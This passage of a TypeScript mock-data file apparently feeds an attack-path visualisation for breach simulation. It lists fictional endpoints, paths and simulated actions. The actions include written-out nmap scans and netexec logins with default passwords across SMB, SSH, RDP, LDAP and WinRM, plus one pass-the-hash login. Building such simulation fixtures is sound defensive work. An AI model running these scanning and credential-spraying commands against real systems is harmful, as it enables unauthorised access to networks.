    {path_id:'s5100EP-p2',path_name:'Cross-Zone Lateral Path',path_color:'#ff9800',node_ids:['s5100EP-ep01','s5100EP-ep04','s5100EP-ep08','s5100EP-ep10','s5100EP-ep16','s5100EP-ep20','s5100EP-ep22','s5100EP-ep23','s5100EP-ep26','s5100EP-ep29','s5100EP-ep35','s5100EP-ep37','s5100EP-ep39','s5100EP-ep40','s5100EP-ep42','s5100EP-ep46','s5100EP-ep50','s5100EP-ep52','s5100EP-ep55','s5100EP-ep58','s5100EP-ep61','s5100EP-ep64','s5100EP-ep68','s5100EP-ep70','s5100EP-ep71','s5100EP-ep73','s5100EP-ep77','s5100EP-ep82','s5100EP-ep84'],path_outcome:'success'},
    {path_id:'s5100EP-p3',path_name:'Blocked Attempt',path_color:'#9c27b0',node_ids:['s5100EP-ep01','s5100EP-ep02'],path_outcome:'failed', path_fail_reason:'PREVENTED by security control', failed_from_node_id:'s5100EP-ep02'},
    {path_id:'s5100EP-p4',path_name:'AD Tier Full Breach',path_color:'#26c6da',node_ids:['s5100EP-ep01','s5100EP-ep75','s5100EP-ep79','s5100EP-ep81','s5100EP-ep83','s5100EP-ep85','s5100EP-ep86','s5100EP-ep87','s5100EP-ep88','s5100EP-ep89','s5100EP-ep91','s5100EP-ep92','s5100EP-ep93','s5100EP-ep94','s5100EP-ep95','s5100EP-ep96','s5100EP-ep97','s5100EP-ep98','s5100EP-ep99'],path_outcome:'success'},
  ],
};

// ══════════════════════════════════════════════════════════════
// ══════════════════════════════════════════════════════════════
// Injector-Only Campaign — 30 Endpoints
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_INJONLY_30EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'sIA-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'172.20.0.1', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24', node_is_entry_point:true },
    { node_id:'sIA-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'172.20.0.2', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24', node_is_entry_point:true },
    { node_id:'sIA-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'172.20.0.3', node_platform:'Windows 11', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'172.20.0.4', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'172.20.0.5', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'172.20.0.6', node_platform:'Windows Server 2019', node_status:'prevented',
      node_agents:['openaev'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'172.20.0.7', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'172.20.0.8', node_platform:'Windows 10', node_status:'detected',
      node_agents:['openaev'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'172.20.0.9', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'172.20.0.10', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'External DMZ', node_subnet:'172.20.0.0/24' },
    { node_id:'sIA-ep11', node_type:'ASSET', node_label:'WEB-11', node_hostname:'WEB-11',
      node_ip:'172.20.1.1', node_platform:'Windows Server 2019', node_status:'detected',
      node_agents:['palo_alto'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep12', node_type:'ASSET', node_label:'APP-12', node_hostname:'APP-12',
      node_ip:'172.20.1.2', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep13', node_type:'ASSET', node_label:'DB-13', node_hostname:'DB-13',
      node_ip:'172.20.1.3', node_platform:'Windows 11', node_status:'prevented',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep14', node_type:'ASSET', node_label:'FILE-14', node_hostname:'FILE-14',
      node_ip:'172.20.1.4', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep15', node_type:'ASSET', node_label:'MAIL-15', node_hostname:'MAIL-15',
      node_ip:'172.20.1.5', node_platform:'CentOS 7', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep16', node_type:'ASSET', node_label:'JUMP-16', node_hostname:'JUMP-16',
      node_ip:'172.20.1.6', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep17', node_type:'ASSET', node_label:'PRINT-17', node_hostname:'PRINT-17',
      node_ip:'172.20.1.7', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep18', node_type:'ASSET', node_label:'DNS-18', node_hostname:'DNS-18',
      node_ip:'172.20.1.8', node_platform:'Windows 10', node_status:'detected',
      node_agents:['sentinel_one'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep19', node_type:'ASSET', node_label:'DC-19', node_hostname:'DC-19',
      node_ip:'172.20.1.9', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep20', node_type:'ASSET', node_label:'WS-20', node_hostname:'WS-20',
      node_ip:'172.20.1.10', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp LAN', node_subnet:'172.20.1.0/24' },
    { node_id:'sIA-ep21', node_type:'ASSET', node_label:'WEB-21', node_hostname:'WEB-21',
      node_ip:'172.20.2.1', node_platform:'Windows Server 2019', node_status:'prevented',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep22', node_type:'ASSET', node_label:'APP-22', node_hostname:'APP-22',
      node_ip:'172.20.2.2', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep23', node_type:'ASSET', node_label:'DB-23', node_hostname:'DB-23',
      node_ip:'172.20.2.3', node_platform:'Windows 11', node_status:'detected',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep24', node_type:'ASSET', node_label:'FILE-24', node_hostname:'FILE-24',
      node_ip:'172.20.2.4', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['palo_alto', 'openaev'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep25', node_type:'ASSET', node_label:'MAIL-25', node_hostname:'MAIL-25',
      node_ip:'172.20.2.5', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep26', node_type:'ASSET', node_label:'JUMP-26', node_hostname:'JUMP-26',
      node_ip:'172.20.2.6', node_platform:'Windows Server 2019', node_status:'detected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep27', node_type:'ASSET', node_label:'PRINT-27', node_hostname:'PRINT-27',
      node_ip:'172.20.2.7', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep28', node_type:'ASSET', node_label:'DNS-28', node_hostname:'DNS-28',
      node_ip:'172.20.2.8', node_platform:'Windows 10', node_status:'prevented',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep29', node_type:'ASSET', node_label:'DC-29', node_hostname:'DC-29',
      node_ip:'172.20.2.9', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['palo_alto', 'openaev'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },
    { node_id:'sIA-ep30', node_type:'ASSET', node_label:'WS-30', node_hostname:'WS-30',
      node_ip:'172.20.2.10', node_platform:'Red Hat 8', node_status:'detected',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'Server Farm', node_subnet:'172.20.2.0/24' },

    { node_id:'sIA-act-01-1', node_type:'ACTION', node_label:'nmap -sS → WEB-01',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,80,443 172.20.0.1' },
    { node_id:'sIA-act-01-2', node_type:'ACTION', node_label:'nmap -sV → WEB-01',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sV -p 22,80,443 172.20.0.1' },
    { node_id:'sIA-act-02-1', node_type:'ACTION', node_label:'nmap -sS → APP-02',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,80,443 172.20.0.2' },
    { node_id:'sIA-act-03-1', node_type:'ACTION', node_label:'nmap -sS → DB-03',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 1433,3306 172.20.0.3' },
    { node_id:'sIA-act-03-2', node_type:'ACTION', node_label:'nmap -sV → DB-03',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sV -p 1433,3306 172.20.0.3' },
    { node_id:'sIA-act-04-1', node_type:'ACTION', node_label:'nmap -sS → FILE-04',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 445,139 172.20.0.4' },
    { node_id:'sIA-act-05-1', node_type:'ACTION', node_label:'nmap -sS → MAIL-05',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 25,110,143 172.20.0.5' },
    { node_id:'sIA-act-05-2', node_type:'ACTION', node_label:'nmap -sV → MAIL-05',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sV -p 25,110,143 172.20.0.5' },
    { node_id:'sIA-act-05-3', node_type:'ACTION', node_label:'nmap -sC → MAIL-05',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sC -p 25,110,143 172.20.0.5' },
    { node_id:'sIA-act-06-1', node_type:'ACTION', node_label:'nmap -sS → JUMP-06',
      node_status:'prevented', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,3389 172.20.0.6' },
    { node_id:'sIA-act-07-1', node_type:'ACTION', node_label:'nmap -sS → PRINT-07',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 9100,515 172.20.0.7' },
    { node_id:'sIA-act-08-1', node_type:'ACTION', node_label:'nmap -sS → DNS-08',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 53,445 172.20.0.8' },
    { node_id:'sIA-act-08-2', node_type:'ACTION', node_label:'nmap -sV → DNS-08',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sV -p 53,445 172.20.0.8' },
    { node_id:'sIA-act-09-1', node_type:'ACTION', node_label:'nmap -sS → DC-09',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 88,389,445 172.20.0.9' },
    { node_id:'sIA-act-10-1', node_type:'ACTION', node_label:'nmap -sS → WS-10',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 135,445,3389 172.20.0.10' },
    { node_id:'sIA-act-11-1', node_type:'ACTION', node_label:'nmap -sS → WEB-11',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 8080,8443 172.20.1.1' },
    { node_id:'sIA-act-12-1', node_type:'ACTION', node_label:'nmap -sS → APP-12',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,873 172.20.1.2' },
    { node_id:'sIA-act-12-2', node_type:'ACTION', node_label:'nmap -sV → APP-12',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sV -p 22,873 172.20.1.2' },
    { node_id:'sIA-act-13-1', node_type:'ACTION', node_label:'nmap -sS → DB-13',
      node_status:'prevented', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 9200,5601 172.20.1.3' },
    { node_id:'sIA-act-14-1', node_type:'ACTION', node_label:'nmap -sS → FILE-14',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 1194,3389 172.20.1.4' },
    { node_id:'sIA-act-15-1', node_type:'ACTION', node_label:'nmap -sS → MAIL-15',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 5601,9200 172.20.1.5' },
    { node_id:'sIA-act-15-2', node_type:'ACTION', node_label:'nmap -sV → MAIL-15',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sV -p 5601,9200 172.20.1.5' },
    { node_id:'sIA-act-16-1', node_type:'ACTION', node_label:'netexec smb → JUMP-16',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.1.6 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-16-2', node_type:'ACTION', node_label:'netexec ssh → JUMP-16',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.1.6 -u root -p toor' },
    { node_id:'sIA-act-17-1', node_type:'ACTION', node_label:'netexec smb → PRINT-17',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.1.7 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-18-1', node_type:'ACTION', node_label:'netexec mssql → DNS-18',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'mssql 172.20.1.8 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-19-1', node_type:'ACTION', node_label:'netexec smb → DC-19',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.1.9 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-20-1', node_type:'ACTION', node_label:'netexec smb → WS-20',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.1.10 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-20-2', node_type:'ACTION', node_label:'netexec ssh → WS-20',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.1.10 -u root -p toor' },
    { node_id:'sIA-act-21-1', node_type:'ACTION', node_label:'netexec smb → WEB-21',
      node_status:'prevented', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.2.1 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-22-1', node_type:'ACTION', node_label:'netexec rdp → APP-22',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'rdp 172.20.2.2 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-23-1', node_type:'ACTION', node_label:'netexec ldap → DB-23',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ldap 172.20.2.3 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-23-2', node_type:'ACTION', node_label:'netexec ssh → DB-23',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.2.3 -u root -p toor' },
    { node_id:'sIA-act-24-1', node_type:'ACTION', node_label:'netexec smb → FILE-24',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.2.4 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-25-1', node_type:'ACTION', node_label:'netexec smb → MAIL-25',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.2.5 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-25-2', node_type:'ACTION', node_label:'netexec ssh → MAIL-25',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.2.5 -u root -p toor' },
    { node_id:'sIA-act-25-3', node_type:'ACTION', node_label:'netexec smb hash → MAIL-25',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.2.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee' },
    { node_id:'sIA-act-26-1', node_type:'ACTION', node_label:'netexec smb → JUMP-26',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.2.6 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-27-1', node_type:'ACTION', node_label:'netexec ssh → PRINT-27',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.2.7 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-27-2', node_type:'ACTION', node_label:'netexec ssh → PRINT-27',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.2.7 -u root -p toor' },
    { node_id:'sIA-act-28-1', node_type:'ACTION', node_label:'netexec smb → DNS-28',
      node_status:'prevented', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 172.20.2.8 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-29-1', node_type:'ACTION', node_label:'netexec winrm → DC-29',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'winrm 172.20.2.9 -u admin -p P@ssw0rd' },
    { node_id:'sIA-act-29-2', node_type:'ACTION', node_label:'netexec ssh → DC-29',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 172.20.2.9 -u root -p toor' },
    { node_id:'sIA-act-30-1', node_type:'ACTION', node_label:'netexec ldap → WS-30',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ldap 172.20.2.10 -u admin -p P@ssw0rd', node_agent:'palo_alto', node_agent:'palo_alto' },
  ],
  attack_path_edges:[
    {edge_id:'sIA-al-01_1',edge_type:'asset_link',edge_source:'sIA-act-01-1',edge_target:'sIA-ep01'},
    {edge_id:'sIA-al-01_2',edge_type:'asset_link',edge_source:'sIA-act-01-2',edge_target:'sIA-ep01'},
    {edge_id:'sIA-al-02_1',edge_type:'asset_link',edge_source:'sIA-act-02-1',edge_target:'sIA-ep02'},
    {edge_id:'sIA-al-03_1',edge_type:'asset_link',edge_source:'sIA-act-03-1',edge_target:'sIA-ep03'},
    {edge_id:'sIA-al-03_2',edge_type:'asset_link',edge_source:'sIA-act-03-2',edge_target:'sIA-ep03'},
    {edge_id:'sIA-al-04_1',edge_type:'asset_link',edge_source:'sIA-act-04-1',edge_target:'sIA-ep04'},
    {edge_id:'sIA-al-05_1',edge_type:'asset_link',edge_source:'sIA-act-05-1',edge_target:'sIA-ep05'},
    {edge_id:'sIA-al-05_2',edge_type:'asset_link',edge_source:'sIA-act-05-2',edge_target:'sIA-ep05'},
    {edge_id:'sIA-al-05_3',edge_type:'asset_link',edge_source:'sIA-act-05-3',edge_target:'sIA-ep05'},
    {edge_id:'sIA-al-06_1',edge_type:'asset_link',edge_source:'sIA-act-06-1',edge_target:'sIA-ep06'},
    {edge_id:'sIA-al-07_1',edge_type:'asset_link',edge_source:'sIA-act-07-1',edge_target:'sIA-ep07'},
    {edge_id:'sIA-al-08_1',edge_type:'asset_link',edge_source:'sIA-act-08-1',edge_target:'sIA-ep08'},
    {edge_id:'sIA-al-08_2',edge_type:'asset_link',edge_source:'sIA-act-08-2',edge_target:'sIA-ep08'},
    {edge_id:'sIA-al-09_1',edge_type:'asset_link',edge_source:'sIA-act-09-1',edge_target:'sIA-ep09'},
    {edge_id:'sIA-al-10_1',edge_type:'asset_link',edge_source:'sIA-act-10-1',edge_target:'sIA-ep10'},
    {edge_id:'sIA-al-11_1',edge_type:'asset_link',edge_source:'sIA-act-11-1',edge_target:'sIA-ep11'},
    {edge_id:'sIA-al-12_1',edge_type:'asset_link',edge_source:'sIA-act-12-1',edge_target:'sIA-ep12'},
    {edge_id:'sIA-al-12_2',edge_type:'asset_link',edge_source:'sIA-act-12-2',edge_target:'sIA-ep12'},
    {edge_id:'sIA-al-13_1',edge_type:'asset_link',edge_source:'sIA-act-13-1',edge_target:'sIA-ep13'},
    {edge_id:'sIA-al-14_1',edge_type:'asset_link',edge_source:'sIA-act-14-1',edge_target:'sIA-ep14'},
    {edge_id:'sIA-al-15_1',edge_type:'asset_link',edge_source:'sIA-act-15-1',edge_target:'sIA-ep15'},
    {edge_id:'sIA-al-15_2',edge_type:'asset_link',edge_source:'sIA-act-15-2',edge_target:'sIA-ep15'},
    {edge_id:'sIA-al-16_1',edge_type:'asset_link',edge_source:'sIA-act-16-1',edge_target:'sIA-ep16'},
    {edge_id:'sIA-al-16_2',edge_type:'asset_link',edge_source:'sIA-act-16-2',edge_target:'sIA-ep16'},
    {edge_id:'sIA-al-17_1',edge_type:'asset_link',edge_source:'sIA-act-17-1',edge_target:'sIA-ep17'},
    {edge_id:'sIA-al-18_1',edge_type:'asset_link',edge_source:'sIA-act-18-1',edge_target:'sIA-ep18'},
    {edge_id:'sIA-al-19_1',edge_type:'asset_link',edge_source:'sIA-act-19-1',edge_target:'sIA-ep19'},
    {edge_id:'sIA-al-20_1',edge_type:'asset_link',edge_source:'sIA-act-20-1',edge_target:'sIA-ep20'},
    {edge_id:'sIA-al-20_2',edge_type:'asset_link',edge_source:'sIA-act-20-2',edge_target:'sIA-ep20'},
    {edge_id:'sIA-al-21_1',edge_type:'asset_link',edge_source:'sIA-act-21-1',edge_target:'sIA-ep21'},
    {edge_id:'sIA-al-22_1',edge_type:'asset_link',edge_source:'sIA-act-22-1',edge_target:'sIA-ep22'},
    {edge_id:'sIA-al-23_1',edge_type:'asset_link',edge_source:'sIA-act-23-1',edge_target:'sIA-ep23'},
    {edge_id:'sIA-al-23_2',edge_type:'asset_link',edge_source:'sIA-act-23-2',edge_target:'sIA-ep23'},
    {edge_id:'sIA-al-24_1',edge_type:'asset_link',edge_source:'sIA-act-24-1',edge_target:'sIA-ep24'},
    {edge_id:'sIA-al-25_1',edge_type:'asset_link',edge_source:'sIA-act-25-1',edge_target:'sIA-ep25'},
    {edge_id:'sIA-al-25_2',edge_type:'asset_link',edge_source:'sIA-act-25-2',edge_target:'sIA-ep25'},
    {edge_id:'sIA-al-25_3',edge_type:'asset_link',edge_source:'sIA-act-25-3',edge_target:'sIA-ep25'},
    {edge_id:'sIA-al-26_1',edge_type:'asset_link',edge_source:'sIA-act-26-1',edge_target:'sIA-ep26'},
    {edge_id:'sIA-al-27_1',edge_type:'asset_link',edge_source:'sIA-act-27-1',edge_target:'sIA-ep27'},
    {edge_id:'sIA-al-27_2',edge_type:'asset_link',edge_source:'sIA-act-27-2',edge_target:'sIA-ep27'},
    {edge_id:'sIA-al-28_1',edge_type:'asset_link',edge_source:'sIA-act-28-1',edge_target:'sIA-ep28'},
    {edge_id:'sIA-al-29_1',edge_type:'asset_link',edge_source:'sIA-act-29-1',edge_target:'sIA-ep29'},
    {edge_id:'sIA-al-29_2',edge_type:'asset_link',edge_source:'sIA-act-29-2',edge_target:'sIA-ep29'},
    {edge_id:'sIA-al-30_1',edge_type:'asset_link',edge_source:'sIA-act-30-1',edge_target:'sIA-ep30'},
  ],
  attack_path_stats:{
    stats_prevented:4,stats_detected:8,stats_undetected:32,
    stats_pending:0,stats_total_actions:44,stats_executed_actions:44,
    stats_captured_endpoints:18,stats_captured_files:10,stats_captured_credentials:10,
stats_captured_users: 7,
stats_captured_cves: 4,
  },
  attack_path_definitions:[
    {path_id:'sIA-p1',path_name:'Initial Access Chain',path_color:'#e91e63',
      node_ids:['sIA-ep01','sIA-ep03','sIA-ep05','sIA-ep08','sIA-ep12','sIA-ep16','sIA-ep20','sIA-ep24','sIA-ep28','sIA-ep30'],path_outcome:'success'},
    {path_id:'sIA-p2',path_name:'Credential Harvest Chain',path_color:'#ff9800',
      node_ids:['sIA-ep02','sIA-ep04','sIA-ep06','sIA-ep10','sIA-ep14','sIA-ep18','sIA-ep22','sIA-ep26'],path_outcome:'success'},
  ],
};
// ══════════════════════════════════════════════════════════════
// Mixed Lateral + Injector — 30 Endpoints
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_MIXED_30EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'sMX-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'192.168.50.1', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24', node_is_entry_point:true, node_is_pivot:true },
    { node_id:'sMX-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'192.168.50.2', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'192.168.50.3', node_platform:'Windows 11', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'192.168.50.4', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'192.168.50.5', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'192.168.50.6', node_platform:'Windows Server 2019', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'192.168.50.7', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'192.168.50.8', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['palo_alto', 'openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24', node_is_pivot:true },
    { node_id:'sMX-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'192.168.50.9', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'192.168.50.10', node_platform:'Red Hat 8', node_status:'detected',
      node_agents:['sentinel_one'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep11', node_type:'ASSET', node_label:'WEB-11', node_hostname:'WEB-11',
      node_ip:'192.168.50.11', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep12', node_type:'ASSET', node_label:'APP-12', node_hostname:'APP-12',
      node_ip:'192.168.50.12', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_agents:['openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep13', node_type:'ASSET', node_label:'DB-13', node_hostname:'DB-13',
      node_ip:'192.168.50.13', node_platform:'Windows 11', node_status:'undetected',
